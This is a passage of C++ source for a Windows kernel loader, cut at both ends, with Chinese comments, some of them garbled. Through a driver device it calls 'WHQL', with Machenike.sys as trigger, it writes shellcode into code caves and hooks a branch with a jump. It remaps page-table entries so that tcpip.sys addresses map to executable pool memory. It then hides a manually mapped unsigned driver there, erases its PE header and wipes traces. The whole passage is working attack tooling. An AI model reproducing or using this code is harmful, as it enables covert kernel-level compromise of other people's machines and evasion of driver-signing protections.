//   9. æå»º ShellcodeParams å¹¶æ³¨å¥ Code Cave
//  10. è§¦å default åæ¯æ§è¡
//  11. æ¢å¤ WHQL default åæ¯å¹¶åå¥åæ ¸ææ¡©æ è®°
// ================================================================
#pragma pack(push, 1)
typedef struct _RUNTIME_FUNCTION_K {
    uint32_t BeginAddress;
    uint32_t EndAddress;
    uint32_t UnwindInfoAddress;
} RUNTIME_FUNCTION_K;
#pragma pack(pop)

// 完整注入 Shellcode：将 ShellcodeParams 写入 Code Cave，并将 default 分支转向 Code Cave
static bool InjectShellcodeFull(
    HANDLE               hDev,
    uint64_t             cr3,
    const WhqlPatchSite& site,
    uint64_t             caveVA,
    const ShellcodeParams& params,
    const uint8_t*       pScCode = nullptr,
    size_t               scCodeSize = 0)
{
    const uint8_t* sc = (pScCode && scCodeSize) ? pScCode : scBytes;
    size_t scSz       = (pScCode && scCodeSize) ? scCodeSize : scBytes_size;

    // 0. 确保 Code Cave 虚拟页具备内核可写权限（PTE.RW = 1），防止 Shellcode 写回状态时触发 0xBE 蓝屏
    EnsureKernelPageWritable(hDev, cr3, caveVA);

    // 1. 将 ShellcodeParams 写入 Code Cave 的起始位置
    if (!WriteKernelVA(hDev, cr3, caveVA, &params, sizeof(params))) {
        LOG_ERR("InjectShellcodeFull: Failed to write ShellcodeParams to Code Cave");
        return false;
    }

    // 2. 将 sc 紧随其后写入 Code Cave
    uint64_t scEntryVA = caveVA + sizeof(params);
    if (!WriteKernelVA(hDev, cr3, scEntryVA, sc, scSz)) {
        LOG_ERR("InjectShellcodeFull: Failed to write shellcode bytes to Code Cave");
        return false;
    }

    // 3. 构建 JMP rel32 跳转指令（E9 <disp32>）挂钩 default 分支
    uint8_t jmpBytes[5] = { 0xE9, 0, 0, 0, 0 };
    int32_t disp = (int32_t)(scEntryVA - (site.kernVA + 5));
    memcpy(jmpBytes + 1, &disp, 4);

    if (!WriteKernelVA(hDev, cr3, site.kernVA, jmpBytes, sizeof(jmpBytes))) {
        LOG_ERR("InjectShellcodeFull: Failed to hook default branch");
        return false;
    }
    LOG_OK("InjectShellcodeFull: Default branch hooked -> Code Cave VA=0x%016llX (disp=0x%08X, size=%zu)",
           scEntryVA, disp, scSz);
    return true;
}

// 恢复 WHQL default 分支原始指令并清理 Code Cave
static bool RestoreWhqlDefaultBranch(
    HANDLE               hDev,
    uint64_t             cr3,
    const WhqlPatchSite& site,
    uint64_t             caveVA,
    size_t               caveCleanSize)
{
    // 恢复 default 分支原始指令 (5 字节)
    if (!WriteKernelVA(hDev, cr3, site.kernVA, site.original, 5)) {
        LOG_WARN("RestoreWhqlDefaultBranch: Failed to restore default branch original bytes");
    } else {
        LOG_OK("RestoreWhqlDefaultBranch: Default branch original bytes restored successfully");
    }

    // 清理 Code Cave (抹除痕迹)
    if (caveVA && caveCleanSize) {
        std::vector<uint8_t> zeros(caveCleanSize, 0);
        WriteKernelVA(hDev, cr3, caveVA, zeros.data(), zeros.size());
        LOG_OK("RestoreWhqlDefaultBranch: Code Cave memory zeroed and cleaned");

        // 恢复 Code Cave 页的原始只读属性
        uint64_t ptePA = 0, curPte = 0;
        if (GetPtePhysAddr(hDev, cr3, caveVA, &ptePA, &curPte) && (curPte & PTE_RW)) {
            uint64_t roPte = curPte & ~PTE_RW;
            WhqlWritePhys(hDev, ptePA, &roPte, sizeof(roPte));
            LOG_OK("RestoreWhqlDefaultBranch: Code Cave PTE restored to Read-Only (PA=0x%016llX)", ptePA);
        }
    }
    return true;
}

// 验证从 startVA 开始的 size 字节区域中，每一个 4KB 页的 PTE 是否均处于 Present 状态
static bool ArePagesPresent(HANDLE hDev, uint64_t cr3, uint64_t startVA, size_t size)
{
    const uint64_t PAGE = 0x1000;
    uint64_t endVA = startVA + size;
    for (uint64_t cur = startVA; cur < endVA; cur += PAGE) {
        uint64_t pa = 0;
        if (!VirtToPhys(hDev, cr3, cur, &pa))
            return false;
    }
    if (size > 0) {
        uint64_t pa = 0;
        if (!VirtToPhys(hDev, cr3, endVA - 1, &pa))
            return false;
    }
    return true;
}

// ================================================================
// 扫描宿主驱动节区内部，寻找能容纳 neededBytes 的连续物理页空洞。
// 必须严格通过 ArePagesPresent 验证每一个 4KB 页的 PTE.Present==1，
// 杜绝因选择已丢弃节区（DISCARDABLE）而导致 WriteKernelVA 失败。
// 返回 RVA（相对于宿主 DllBase），0 表示未找到。
// ================================================================
static uint32_t FindHostInternalCave(
    HANDLE         hDev,
    uint64_t       cr3,
    uint64_t       hostDrvBase,
    uint32_t       hostOrigSize,
    IMAGE_NT_HEADERS64* nt,          // 指向用户态 hdrBuf 内的 NT 头（只读节表）
    uint32_t       neededBytes,
    const char*    hostDrvNameA)
{
    const uint32_t PAGE = 0x1000;
    auto* sec = IMAGE_FIRST_SECTION(nt);
    WORD  nSec = nt->FileHeader.NumberOfSections;

    LOG_INFO("FindHostInternalCave[%s]: scanning %u sections for cave >= 0x%X bytes...",
             hostDrvNameA, nSec, neededBytes);

    // --- 打印宿主节区诊断信息 ---
    for (WORD i = 0; i < nSec; i++) {
        char secName[9] = {};
        memcpy(secName, sec[i].Name, 8);
        uint32_t secRVA     = sec[i].VirtualAddress;
        uint32_t vSize      = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
        bool isDiscardable  = (sec[i].Characteristics & IMAGE_SCN_MEM_DISCARDABLE) != 0;
        uint64_t dummyPA    = 0;
        bool firstPageOk    = VirtToPhys(hDev, cr3, hostDrvBase + secRVA, &dummyPA);

        LOG_INFO("  [%02d] %-8s RVA=0x%08X vSize=0x%08X Discard=%d Present=%d",
                 i, secName, secRVA, vSize, isDiscardable ? 1 : 0, firstPageOk ? 1 : 0);
    }

    // 提示：严禁将活跃节区（如 .text / .data / PAGE）的起始段作为 Cave，
    // 那些区域承载着系统驱动的正在运行的代码和数据，覆写会导致 0x1E / 0x3B 蓝屏。
    // 大容量载荷统一走方案 A（PTE Remap 挂接引擎）。

    // --- 策略 2：节区末尾页间隙（VirtualSize 到 AlignedVirtualSize 之间，物理页存在）---
    for (WORD i = 0; i < nSec; i++) {
        char secName[9] = {};
        memcpy(secName, sec[i].Name, 8);
        uint32_t secRVA     = sec[i].VirtualAddress;
        uint32_t vSize      = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
        uint32_t alignedVSz = (vSize + PAGE - 1) & ~(PAGE - 1);
        uint32_t gap        = (alignedVSz > vSize) ? (alignedVSz - vSize) : 0;

        if (gap >= neededBytes && secRVA + vSize + neededBytes <= hostOrigSize) {
            uint32_t caveRVA = secRVA + vSize;
            if (ArePagesPresent(hDev, cr3, hostDrvBase + caveRVA, neededBytes)) {
                LOG_OK("FindHostInternalCave[%s]: page-gap in '%s' RVA=0x%X gap=0x%X (pages verified)",
                       hostDrvNameA, secName, caveRVA, gap);
                return caveRVA;
            }
        }
    }

    // --- 策略 3：相邻节区之间的裂缝（已映射物理页）---
    for (WORD i = 0; i + 1 < nSec; i++) {
        uint32_t thisEnd = sec[i].VirtualAddress +
                           ((sec[i].Misc.VirtualSize + PAGE - 1) & ~(PAGE - 1));
        uint32_t nextStart = sec[i + 1].VirtualAddress;
        if (nextStart > thisEnd && nextStart - thisEnd >= neededBytes &&
            thisEnd + neededBytes <= hostOrigSize)
        {
            if (ArePagesPresent(hDev, cr3, hostDrvBase + thisEnd, neededBytes)) {
                LOG_OK("FindHostInternalCave[%s]: inter-section gap RVA=0x%X size=0x%X (pages verified)",
                       hostDrvNameA, thisEnd, nextStart - thisEnd);
                return thisEnd;
            }
        }
    }

    // --- 策略 4：尾部对齐填充（最后一个节到 SizeOfImage 之间，已映射物理页）---
    if (nSec > 0) {
        uint32_t lastRVA   = sec[nSec - 1].VirtualAddress;
        uint32_t lastVSz   = sec[nSec - 1].Misc.VirtualSize ? sec[nSec - 1].Misc.VirtualSize
                                                              : sec[nSec - 1].SizeOfRawData;
        uint32_t afterLast = (lastRVA + lastVSz + PAGE - 1) & ~(PAGE - 1);
        if (afterLast + neededBytes <= hostOrigSize) {
            if (ArePagesPresent(hDev, cr3, hostDrvBase + afterLast, neededBytes)) {
                LOG_OK("FindHostInternalCave[%s]: tail padding RVA=0x%X avail=0x%X (pages verified)",
                       hostDrvNameA, afterLast, hostOrigSize - afterLast);
                return afterLast;
            }
        }
    }

    LOG_WARN("FindHostInternalCave[%s]: no resident cave >= 0x%X bytes with valid physical pages found inside SizeOfImage=0x%X",
             hostDrvNameA, neededBytes, hostOrigSize);
    return 0;
}

// ================================================================
// AllocKernelPoolViaWhql
//
// 触发微型探针在内核中通过 ExAllocatePoolWithTag 分配 neededBytes
// 大小的真实 NonPagedPool 物理内存块，返回内核池虚拟地址 PoolVA。
// ================================================================
static uint64_t AllocKernelPoolViaWhql(
    HANDLE hDev, uint64_t cr3,
    uint64_t triggerDrvBase, uint32_t triggerDrvSize,
    const WhqlPatchSite& site, uint64_t caveVA,
    uint64_t ntoskrnlBase, uint32_t neededBytes)
{
    InjectContext ctx = {};
    ctx.hDev         = hDev;
    ctx.cr3          = cr3;
    ctx.ntoskrnlBase = ntoskrnlBase;
    ctx.hookReturnVA = site.kernVA + 5;
    MappedImage dummyImg = {};
    dummyImg.SizeOfImage = neededBytes;
    ctx.pImg         = &dummyImg;

    ShellcodeParams params = {};
    if (!BuildShellcodeParams(ctx, params)) {
        LOG_ERR("AllocKernelPoolViaWhql: BuildShellcodeParams failed");
        return 0;
    }
    params.imageSize = neededBytes;

    // 确保 Code Cave 虚拟页具备内核可写权限（PTE.RW = 1），防止探针写回 allocatedPoolVA 时触发 0xBE 蓝屏
    uint64_t oldCavePte = 0, cavePtePA = 0;
    EnsureKernelPageWritable(hDev, cr3, caveVA, &oldCavePte, &cavePtePA);

    if (!WriteKernelVA(hDev, cr3, caveVA, &params, sizeof(params))) {
        LOG_ERR("AllocKernelPoolViaWhql: failed to write params");
        return 0;
    }

    uint64_t scEntryVA = caveVA + sizeof(params);
    if (!WriteKernelVA(hDev, cr3, scEntryVA, scAllocProbe, sizeof(scAllocProbe))) {
        LOG_ERR("AllocKernelPoolViaWhql: failed to write scAllocProbe");
        return 0;
    }

    uint8_t jmpBytes[5] = { 0xE9, 0, 0, 0, 0 };
    int32_t disp = (int32_t)(scEntryVA - (site.kernVA + 5));
    memcpy(jmpBytes + 1, &disp, 4);
    if (!WriteKernelVA(hDev, cr3, site.kernVA, jmpBytes, sizeof(jmpBytes))) {
        LOG_ERR("AllocKernelPoolViaWhql: hook installation failed");
        return 0;
    }

    LOG_INFO("AllocKernelPoolViaWhql: triggering ExAllocatePoolWithTag(0x%X bytes)...", neededBytes);
    uint32_t gle = 0;
    bool ok = WhqlTrigger(hDev, &gle);

    // 立即还原 hook
    WriteKernelVA(hDev, cr3, site.kernVA, site.original, 5);

    // 恢复 Code Cave 页的原始只读属性
    if (cavePtePA && oldCavePte) {
        RestoreKernelPagePte(hDev, cavePtePA, oldCavePte);
    }

    if (!ok) {
        LOG_ERR("AllocKernelPoolViaWhql: WhqlTrigger failed (GLE=%u)", gle);
        return 0;
    }

    ShellcodeParams retParams = {};
    if (!ReadKernelVA(hDev, cr3, caveVA, &retParams, sizeof(retParams))) {
        LOG_ERR("AllocKernelPoolViaWhql: failed to read back params");
        return 0;
    }

    if (!retParams.allocatedPoolVA) {
        LOG_ERR("AllocKernelPoolViaWhql: allocatedPoolVA is NULL");
        return 0;
    }

    LOG_OK("AllocKernelPoolViaWhql: kernel pool allocated successfully at PoolVA=0x%016llX (0x%X bytes)",
           retParams.allocatedPoolVA, neededBytes);
    return retParams.allocatedPoolVA;
}

// ================================================================
// PteRemapHostDriver
//
// 使用内核分配的合法 NonPagedPool 物理内存页，通过物理页表（PTE）修改，
// 将物理页挂接到宿主驱动（如 tcpip.sys）内部原生虚拟地址。
// ================================================================
static bool PteRemapHostDriver(
    HANDLE   hDev,
    uint64_t cr3,
    uint64_t hostDrvBase,
    uint32_t targetRVA,
    uint64_t sourcePoolVA,
    uint32_t totalBytes)
{
    const uint64_t PAGE = 0x1000;
    uint32_t numPages = (totalBytes + PAGE - 1) / PAGE;

    LOG_INFO("PteRemapHostDriver: remapping %u pages (0x%X bytes) from PoolVA=0x%016llX to HostVA=0x%016llX",
             numPages, totalBytes, sourcePoolVA, hostDrvBase + targetRVA);

    for (uint32_t i = 0; i < numPages; i++) {
        uint64_t curPoolVA = sourcePoolVA + (uint64_t)i * PAGE;
        uint64_t poolPA = 0;
        if (!VirtToPhys(hDev, cr3, curPoolVA, &poolPA)) {
            LOG_ERR("PteRemapHostDriver: cannot get PA for pool page %u (VA=0x%016llX)", i, curPoolVA);
            return false;
        }

        uint64_t curTargetVA = hostDrvBase + targetRVA + (uint64_t)i * PAGE;
        uint64_t ptePA = 0, oldPte = 0;
        if (!GetPtePhysAddr(hDev, cr3, curTargetVA, &ptePA, &oldPte)) {
            LOG_ERR("PteRemapHostDriver: cannot locate PTE PA for target page %u (VA=0x%016llX)", i, curTargetVA);
            return false;
        }

        // 构造新 PTE：指向 NonPagedPool 物理页，设置 Present=1, RW=1, Accessed=1, Dirty=1, Global=1，清除 NX (允许代码执行)
        uint64_t newPte = (poolPA & PTE_PFN_MASK) | PTE_PRESENT | PTE_RW | PTE_ACCESSED | PTE_DIRTY | PTE_GLOBAL;
        if (!WhqlWritePhys(hDev, ptePA, &newPte, sizeof(newPte))) {
            LOG_ERR("PteRemapHostDriver: failed to write PTE at PA=0x%016llX", ptePA);
            return false;
        }

        LOG_INFO("  [PTE Remap #%02u] TargetVA=0x%016llX -> PA=0x%016llX (PTE @ 0x%016llX, Old=0x%016llX, New=0x%016llX)",
                 i, curTargetVA, poolPA, ptePA, oldPte, newPte);
    }

    if (!ArePagesPresent(hDev, cr3, hostDrvBase + targetRVA, totalBytes)) {
        LOG_ERR("PteRemapHostDriver: verification failed, pages not all present");
        return false;
    }

    LOG_OK("PteRemapHostDriver: successfully remapped %u pages into host driver!", numPages);
    return true;
}

// ================================================================
// InjectPayloadAndPdataIntoHost
//
// 将 drv_wsk 整个镜像（≈92KB）和合并 .pdata（≈1.4KB）全部写入
// 宿主驱动（tcpip.sys）内部原生空闲区域，不超出 SizeOfImage。
// 若无现成常驻物理空洞，自动激活方案 A：通过微型探针分配 NonPagedPool 并完成 PTE Remap。
// ================================================================
static bool InjectPayloadAndPdataIntoHost(
    HANDLE         hDev,
    uint64_t       cr3,
    uint64_t       hostDrvBase,
    uint32_t       hostOrigSize,
    uint64_t       hostLdrEntryVA,
    const wchar_t* hostDrvName,
    MappedImage&   payloadImg,          // 非 const：写入后更新 KernelBase
    uint32_t&      outNewSize,
    std::vector<uint8_t>& outCleanDiskHdr,
    uint64_t&      outPayloadKernVA,    // [out] payload 落点内核 VA
    uint32_t&      outPdataRVA,         // [out] 合并 pdata 落点 RVA（相对 hostDrvBase）
    uint32_t&      outPdataTotalSize,   // [out] 合并 pdata 总字节数
    uint64_t       ntoskrnlBase = 0,
    uint64_t       triggerDrvBase = 0,
    uint32_t       triggerDrvSize = 0,
    const WhqlPatchSite* pSite = nullptr,
    uint64_t       caveVA = 0)
{
    outNewSize        = hostOrigSize;
    outPayloadKernVA  = 0;
    outPdataRVA       = 0;
    outPdataTotalSize = 0;

    char hostNameA[256] = {};
    WideCharToMultiByte(CP_ACP, 0, hostDrvName, -1, hostNameA, sizeof(hostNameA) - 1, nullptr, nullptr);

    LOG_INFO("InjectPayloadAndPdataIntoHost: host='%ls' Base=0x%016llX OrigSize=0x%X PayloadSize=0x%X PdataSize=0x%X",
             hostDrvName, hostDrvBase, hostOrigSize,
             payloadImg.SizeOfImage, payloadImg.ExceptionDirSize);

    // --- 0. 读取宿主内存 PE 头（前 0x1000 字节） ---
    uint8_t hdrBuf[0x1000] = {};
    if (!ReadKernelVA(hDev, cr3, hostDrvBase, hdrBuf, sizeof(hdrBuf))) {
        LOG_ERR("InjectPayloadAndPdataIntoHost: cannot read host PE header");
        return false;
    }
    if (outCleanDiskHdr.empty()) {
        outCleanDiskHdr.assign(hdrBuf, hdrBuf + sizeof(hdrBuf));
    }

    auto* dos = (IMAGE_DOS_HEADER*)hdrBuf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE ||
        dos->e_lfanew >= (LONG)(sizeof(hdrBuf) - sizeof(IMAGE_NT_HEADERS64))) {
        LOG_ERR("InjectPayloadAndPdataIntoHost: bad host DOS header");
        return false;
    }
    auto* nt = (IMAGE_NT_HEADERS64*)(hdrBuf + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        LOG_ERR("InjectPayloadAndPdataIntoHost: bad host NT signature");
        return false;
    }

    // --- 1. 确定合并 pdata 大小（受 CFG_ENABLE_MERGED_PDATA 宏开关控制）---
    uint32_t hostExRVA  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
    uint32_t hostExSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;
    uint32_t plExRVA    = payloadImg.ExceptionDirRVA;
    uint32_t plExSize   = payloadImg.ExceptionDirSize;
#if CFG_ENABLE_MERGED_PDATA
    uint32_t mergedPdataSize = hostExSize + plExSize;
    LOG_INFO("InjectPayloadAndPdataIntoHost: [CFG_ENABLE_MERGED_PDATA=1] Merged .pdata enabled (HostEx=0x%X, PlEx=0x%X, Total=0x%X)",
             hostExSize, plExSize, mergedPdataSize);
#else
    uint32_t mergedPdataSize = 0;
    LOG_INFO("InjectPayloadAndPdataIntoHost: [CFG_ENABLE_MERGED_PDATA=0] Merged .pdata disabled, preserving clean host exception directory");
#endif

    // --- 2. 寻找 payload cave ---
    uint32_t payloadCaveRVA = FindHostInternalCave(
        hDev, cr3, hostDrvBase, hostOrigSize, nt,
        payloadImg.SizeOfImage, hostNameA);

    // 若无现成物理空洞，启用方案 A：PTE Remap 挂接引擎
    if (payloadCaveRVA == 0 && pSite && caveVA && ntoskrnlBase) {
        LOG_INFO("InjectPayloadAndPdataIntoHost: attempting PTE Remap (Plan A) into host '%ls'...", hostDrvName);

        uint32_t candidateTargetRVA = 0;
        uint32_t totalNeededBytes = payloadImg.SizeOfImage + mergedPdataSize + 0x1000;
        uint32_t needRemapBytes = (totalNeededBytes + 0xFFF) & ~0xFFF;

        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            auto* s = &IMAGE_FIRST_SECTION(nt)[i];
            char sName[9] = {};
            memcpy(sName, s->Name, 8);
            uint32_t rva = s->VirtualAddress;
            uint32_t vSz = s->Misc.VirtualSize ? s->Misc.VirtualSize : s->SizeOfRawData;

            // 优先选择 .rsrc 或 .reloc 等容量充裕的大节区
            if ((_strnicmp(sName, ".rsrc", 5) == 0 || _strnicmp(sName, ".reloc", 6) == 0) &&
                vSz >= needRemapBytes &&
                rva + needRemapBytes <= hostOrigSize)
            {
                candidateTargetRVA = rva;
                LOG_OK("InjectPayloadAndPdataIntoHost: selected section '%s' RVA=0x%X (vSize=0x%X) for PTE Remap (needs 0x%X bytes)",
                       sName, rva, vSz, needRemapBytes);
                break;
            }
        }

        if (candidateTargetRVA != 0) {
            uint64_t poolVA = AllocKernelPoolViaWhql(
                hDev, cr3, triggerDrvBase, triggerDrvSize,
                *pSite, caveVA, ntoskrnlBase, needRemapBytes);

            if (poolVA != 0) {
                if (PteRemapHostDriver(hDev, cr3, hostDrvBase, candidateTargetRVA, poolVA, needRemapBytes)) {
                    payloadCaveRVA = candidateTargetRVA;
                }
            }
        }
    }

    if (payloadCaveRVA == 0) {
        LOG_ERR("InjectPayloadAndPdataIntoHost: no internal cave or PTE remap target for payload");
        return false;
    }

    if ((uint64_t)payloadCaveRVA + payloadImg.SizeOfImage > hostOrigSize) {
        LOG_ERR("InjectPayloadAndPdataIntoHost: payload cave RVA=0x%X would overflow hostOrigSize=0x%X",
                payloadCaveRVA, hostOrigSize);
        return false;
    }

    // --- 3. 对 payload 做 reloc（目标 VA = hostDrvBase + payloadCaveRVA） ---
    uint64_t payloadTargetVA = hostDrvBase + payloadCaveRVA;
    if (!ApplyRelocation(payloadImg, payloadTargetVA)) {
        LOG_WARN("InjectPayloadAndPdataIntoHost: ApplyRelocation failed (non-fatal if no delta)");
    }
    payloadImg.KernelBase = payloadTargetVA;

    // --- 4. 物理写入 payload 到 payload cave ---
    if (!WriteKernelVA(hDev, cr3, payloadTargetVA, payloadImg.Image.data(), payloadImg.SizeOfImage)) {
        LOG_ERR("InjectPayloadAndPdataIntoHost: WriteKernelVA payload failed");
        return false;
    }
    LOG_OK("InjectPayloadAndPdataIntoHost: payload written to host VA=0x%016llX (0x%X bytes)",
           payloadTargetVA, payloadImg.SizeOfImage);

    outPayloadKernVA = payloadTargetVA;

    // --- 5. 构建合并 pdata 并写入（受 CFG_ENABLE_MERGED_PDATA 控制）---
#if CFG_ENABLE_MERGED_PDATA
    if (mergedPdataSize > 0) {
        uint32_t pdataCaveRVA = payloadCaveRVA + payloadImg.SizeOfImage;
        pdataCaveRVA = (pdataCaveRVA + 0x1F) & ~0x1Fu;  // 32 字节对齐

        if (pdataCaveRVA + mergedPdataSize <= hostOrigSize) {
            std::vector<uint8_t> mergedBuf(mergedPdataSize, 0);

            // 5a. 复制宿主原始 pdata
            if (hostExRVA && hostExSize) {
                ReadKernelVA(hDev, cr3, hostDrvBase + hostExRVA,
                             mergedBuf.data(), hostExSize);
            }

            // 5b. 追加 payload .pdata（RVA 偏移增加 payloadCaveRVA）
            if (plExRVA && plExSize && plExRVA + plExSize <= payloadImg.Image.size()) {
                uint32_t plCount = plExSize / sizeof(RUNTIME_FUNCTION_K);
                auto* src = (const RUNTIME_FUNCTION_K*)(payloadImg.Image.data() + plExRVA);
                auto* dst = (RUNTIME_FUNCTION_K*)(mergedBuf.data() + hostExSize);
                for (uint32_t i = 0; i < plCount; i++) {
                    dst[i].BeginAddress      = src[i].BeginAddress      + payloadCaveRVA;
                    dst[i].EndAddress        = src[i].EndAddress        + payloadCaveRVA;
                    dst[i].UnwindInfoAddress = src[i].UnwindInfoAddress + payloadCaveRVA;
                }
                LOG_OK("InjectPayloadAndPdataIntoHost: relocated %u RUNTIME_FUNCTION entries (+RVA 0x%X)",
                       plCount, payloadCaveRVA);
            }

            // 5c. 写入合并 pdata
            uint64_t pdataCaveVA = hostDrvBase + pdataCaveRVA;
            if (WriteKernelVA(hDev, cr3, pdataCaveVA, mergedBuf.data(), mergedPdataSize)) {
                LOG_OK("InjectPayloadAndPdataIntoHost: merged pdata written to host VA=0x%016llX (0x%X bytes)",
                       pdataCaveVA, mergedPdataSize);

                // 6. 更新宿主内存 PE 头 DataDirectory[EXCEPTION]
                nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress = pdataCaveRVA;
                nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size           = mergedPdataSize;
                WriteKernelVA(hDev, cr3, hostDrvBase, hdrBuf, sizeof(hdrBuf));
                LOG_OK("InjectPayloadAndPdataIntoHost: host PE DataDirectory[EXCEPTION] updated RVA=0x%X Size=0x%X",
                       pdataCaveRVA, mergedPdataSize);

                outPdataRVA       = pdataCaveRVA;
                outPdataTotalSize = mergedPdataSize;
            } else {
                LOG_WARN("InjectPayloadAndPdataIntoHost: failed to write merged pdata (non-fatal)");
            }
        } else {
            LOG_WARN("InjectPayloadAndPdataIntoHost: pdata cave would overflow hostOrigSize, skipping pdata merge");
        }
    }
#else
    LOG_INFO("InjectPayloadAndPdataIntoHost: [CFG_ENABLE_MERGED_PDATA=0] skipping pdata merge and PE header modification");
#endif

    outNewSize = hostOrigSize;
    return true;
}

// ================================================================
// ---- 旧接口保留（向后兼容，内部转发到新实现） ----
// ================================================================
static bool ExtendHostDriverSections(
    HANDLE   hDev,
    uint64_t cr3,
    uint64_t hostDrvBase,
    uint32_t hostOrigSize,
    uint64_t hostLdrEntryVA,
    const wchar_t* hostDrvName,
    MappedImage& payloadImg,
    uint32_t& outNewSize,
    std::vector<uint8_t>& outCleanDiskHdr)
{
    // 转发到新实现（InjectPayloadAndPdataIntoHost）
    // 旧接口不再直接处理，保留签名供现有调用点编译通过
    uint64_t unusedPayloadKernVA = 0;
    uint32_t unusedPdataRVA      = 0;
    uint32_t unusedPdataSize     = 0;
    return InjectPayloadAndPdataIntoHost(
        hDev, cr3, hostDrvBase, hostOrigSize, hostLdrEntryVA, hostDrvName,
        payloadImg, outNewSize, outCleanDiskHdr,
        unusedPayloadKernVA, unusedPdataRVA, unusedPdataSize);
}

static bool LoadDrvWsk(const wchar_t* drvWskPath,
                       const wchar_t* triggerDrvName = L"Machenike.sys",
                       const wchar_t* preferredHostDrvName = L"tcpip.sys",
                       bool forceReload = false,
                       const DRV_BOOT_CONFIG* pBootConfig = nullptr)
{
    // ---- 1. æå¼è®¾å¤ ----
    HANDLE hDev = WhqlOpen();
    if (hDev == INVALID_HANDLE_VALUE) {
        LOG_ERR("LoadDrvWsk: Unable to open WHQL device");
        return false;
    }

    // ---- 2. è·åç³»ç»ä¿¡æ¯ ----
    WINPMEM_MEMORY_INFO info = {};
    if (!WhqlGetInfo(hDev, &info)) {
        LOG_ERR("LoadDrvWsk: WhqlGetInfo failed");
        CloseHandle(hDev);
        return false;
    }
    uint64_t cr3               = (uint64_t)info.CR3.QuadPart;
    uint64_t ntoskrnlBase      = (uint64_t)info.KernBase.QuadPart;
    uint64_t psLoadedModList   = (uint64_t)info.PsLoadedModuleList.QuadPart;
    if (psLoadedModList == 0) {
        psLoadedModList = ResolvePsLoadedModuleList(ntoskrnlBase);
    }

    LOG_INFO("LoadDrvWsk: CR3=0x%016llX NtosBase=0x%016llX PsLML=0x%016llX",
             cr3, ntoskrnlBase, psLoadedModList);

    // ---- 3. æ¾è§¦åé©±å¨å¨ PsLoadedModuleList ä¸­çæ¡ç® ----
    uint64_t triggerDrvBase     = 0;
    uint32_t triggerDrvSize     = 0;
    uint64_t triggerLdrEntryVA  = 0;
    bool foundMod = false;
    if (psLoadedModList != 0) {
        foundMod = FindWhqlModuleInLdr(hDev, cr3, psLoadedModList,
                                      triggerDrvName, triggerDrvBase, triggerDrvSize, triggerLdrEntryVA);
    }
    if (!foundMod) {
        LOG_WARN("LoadDrvWsk: %ls not found via PsLoadedModuleList, falling back to Psapi...", triggerDrvName);
        foundMod = FindWhqlModuleViaPsapi(triggerDrvName, triggerDrvBase, triggerDrvSize);
    }
    if (!foundMod) {
        LOG_ERR("LoadDrvWsk: Trigger driver %ls not found in system driver list", triggerDrvName);
        CloseHandle(hDev);
        return false;
    }

    // ---- 3.1 æ¹æ¡ 1ï¼æ£æµåæ ¸ç©çææ¡©ï¼é²æ­¢éå¤å è½½ ----
    if (!forceReload) {
        // åæ£æ¥é¦éå®¿ä¸»é©±å¨ (å¦ tcpip.sys)
        if (preferredHostDrvName && wcslen(preferredHostDrvName) > 0) {
            uint64_t prefBase = 0;
            uint32_t prefSize = 0;
            uint64_t prefLdrVA = 0;
            bool foundPref = false;
            if (psLoadedModList != 0) {
                foundPref = FindWhqlModuleInLdr(hDev, cr3, psLoadedModList,
                                                preferredHostDrvName, prefBase, prefSize, prefLdrVA);
            }
            if (!foundPref) {
                foundPref = FindWhqlModuleViaPsapi(preferredHostDrvName, prefBase, prefSize);
            }
            if (foundPref && CheckDriverCanary(hDev, cr3, prefBase, prefSize, preferredHostDrvName)) {
                CloseHandle(hDev);
                return true;
            }
        }
        // åæ£æ¥è§¦åé©±å¨ (Machenike.sys)
        if (CheckDriverCanary(hDev, cr3, triggerDrvBase, triggerDrvSize, triggerDrvName)) {
            CloseHandle(hDev);
            return true;
        }
    } else {
        LOG_WARN("LoadDrvWsk: Force reload flag enabled, clearing existing kernel canary.");
        ClearDriverCanary(hDev, cr3);
    }

    // ---- 4. æ«æ default åæ¯ç¹å¾ç  ----
    WhqlPatchSite site = {};
    if (!FindWhqlDefaultBranch(hDev, cr3, triggerDrvBase, triggerDrvSize, site)) {
        LOG_ERR("LoadDrvWsk: WHQL default branch signature not found");
        CloseHandle(hDev);
        return false;
    }

    // ---- 5. è¯»åå¹¶å±å¼ drv_wsk.sys ----
    auto rawBuf = ReadFile(drvWskPath);
    if (rawBuf.empty()) {
        LOG_ERR("LoadDrvWsk: Failed to read %ls", drvWskPath);
        CloseHandle(hDev);
        return false;
    }

    MappedImage img = {};
    if (!SectionMap(rawBuf, img)) {
        LOG_ERR("LoadDrvWsk: SectionMap failed");
        CloseHandle(hDev);
        return false;
    }

    // ---- 6. ä¿®å¤éå®ä½ä¸ IAT ----
    if (!FixIAT(hDev, cr3, ntoskrnlBase, img)) {
        LOG_ERR("LoadDrvWsk: FixIAT failed");
        CloseHandle(hDev);
        return false;
    }

    // ---- 7. æ¹é¤ PE å¤´ ----
    ErasePEHeader(img);

    // ---- 8. éå®ç¨æ·æå±å¼éååå­é¡µ ----
    if (!VirtualLock(img.Image.data(), img.Image.size())) {
        LOG_WARN("LoadDrvWsk: VirtualLock warning GLE=%lu (non-fatal, continuing)", GetLastError());
    }

    uint64_t userImageVA = (uint64_t)img.Image.data();
    LOG_INFO("LoadDrvWsk: [Plan C] User-mode mapped image ready VA=0x%016llX size=%zu",
             userImageVA, img.Image.size());

    // ---- 9. å®ä½è§¦åé©±å¨ä¸­çå®å¨ä»£ç ç©ºæ´ (Code Cave) ----
    const size_t totalPayloadSize = sizeof(ShellcodeParams) + scBytes_size;
    uint64_t caveVA = FindWhqlCodeCaveVA(hDev, cr3, triggerDrvBase, totalPayloadSize);
    if (!caveVA) {
        LOG_ERR("LoadDrvWsk: Failed to locate available Code Cave");
        VirtualUnlock(img.Image.data(), img.Image.size());
